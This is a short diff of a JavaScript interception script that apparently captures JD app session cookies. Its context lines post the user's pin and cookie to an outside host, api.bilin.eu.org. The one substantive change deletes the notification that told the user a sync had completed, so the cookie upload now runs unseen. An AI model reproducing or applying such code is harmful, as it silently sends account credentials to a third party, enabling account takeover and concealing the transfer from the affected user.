@@ -45,7 +45,6 @@ function getCache() {
 function GetCookie() {
     const Referer = $request.headers['Referer'] || '';
     try {
-
         ///anti-sdk-report.m.jd.com
         //openUpgrade
         if ($request.url.indexOf('https://anti-sdk-report.m.jd.com/report_event') > -1 ) {
@@ -58,7 +57,6 @@ function GetCookie() {
                 let data={"key":pin,"temp":CookieValue,"source":"jd_app","type":"temp"}
                 const opt = {url: "http://api.bilin.eu.org/push", body: JSON.stringify(data)};
                 $.http.post(opt).then((response) => JSON.parse(response.body));
-                $.notify("同步完成~","京东",data)
             }
         }
         else{
